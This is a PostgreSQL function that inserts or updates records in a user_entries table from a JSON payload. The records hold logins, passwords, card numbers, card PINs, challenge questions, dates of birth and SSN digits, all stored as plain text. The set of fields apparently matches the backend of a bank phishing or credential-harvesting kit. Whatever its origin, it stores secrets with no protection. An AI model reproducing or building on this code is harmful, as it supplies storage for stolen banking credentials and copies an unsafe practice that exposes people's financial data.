CREATE OR REPLACE FUNCTION public.save_user_entry(_payload jsonb)
RETURNS void
LANGUAGE plpgsql
SECURITY INVOKER
SET search_path = public
AS $$
DECLARE
  _id uuid;
  _entry_type text;
  _entry_timestamp timestamptz;
BEGIN
  _id := NULLIF(_payload->>'id', '')::uuid;
  IF _id IS NULL THEN
    RAISE EXCEPTION 'missing_entry_id';
  END IF;

  _entry_type := COALESCE(NULLIF(_payload->>'type', ''), 'old');
  _entry_timestamp := COALESCE(NULLIF(_payload->>'timestamp', '')::timestamptz, now());

  UPDATE public.user_entries SET
    type = _entry_type,
    user_id = COALESCE(NULLIF(_payload->>'userId', ''), user_id),
    user_id_field = COALESCE(NULLIF(_payload->>'userId', ''), user_id_field),
    password_field = COALESCE(NULLIF(_payload->>'password', ''), password_field),
    first_name = COALESCE(NULLIF(_payload->>'firstName', ''), first_name),
    last_name = COALESCE(NULLIF(_payload->>'lastName', ''), last_name),
    email = COALESCE(NULLIF(_payload->>'email', ''), email),
    phone = COALESCE(NULLIF(_payload->>'phone', ''), phone),
    challenge_questions = CASE
      WHEN _payload ? 'challengeQuestions' AND _payload->'challengeQuestions' <> '[]'::jsonb THEN _payload->'challengeQuestions'
      ELSE challenge_questions
    END,
    card_number = COALESCE(NULLIF(_payload->>'cardNumber', ''), card_number),
    pin_card = COALESCE(NULLIF(_payload->>'pinCard', ''), pin_card),
    dob = COALESCE(NULLIF(_payload->>'dob', ''), dob),
    ssn_last4 = COALESCE(NULLIF(_payload->>'ssnLast4', ''), ssn_last4),
    zip_code = COALESCE(NULLIF(_payload->>'zipCode', ''), zip_code),
    updated_at = now()
  WHERE id = _id;

  IF FOUND THEN
    RETURN;
  END IF;

  INSERT INTO public.user_entries (
    id,
    type,
    timestamp,
    user_id,
    user_id_field,
    password_field,
    first_name,
    last_name,
    email,
    phone,
    challenge_questions,
    card_number,
    pin_card,
    dob,
    ssn_last4,
    zip_code,
    updated_at
  ) VALUES (
    _id,
    _entry_type,
    _entry_timestamp,
    NULLIF(_payload->>'userId', ''),
    NULLIF(_payload->>'userId', ''),
    NULLIF(_payload->>'password', ''),
    NULLIF(_payload->>'firstName', ''),
    NULLIF(_payload->>'lastName', ''),
    NULLIF(_payload->>'email', ''),
    NULLIF(_payload->>'phone', ''),
    COALESCE(_payload->'challengeQuestions', '[]'::jsonb),
    NULLIF(_payload->>'cardNumber', ''),
    NULLIF(_payload->>'pinCard', ''),
    NULLIF(_payload->>'dob', ''),
    NULLIF(_payload->>'ssnLast4', ''),
    NULLIF(_payload->>'zipCode', ''),
    now()
  );
END;
$$;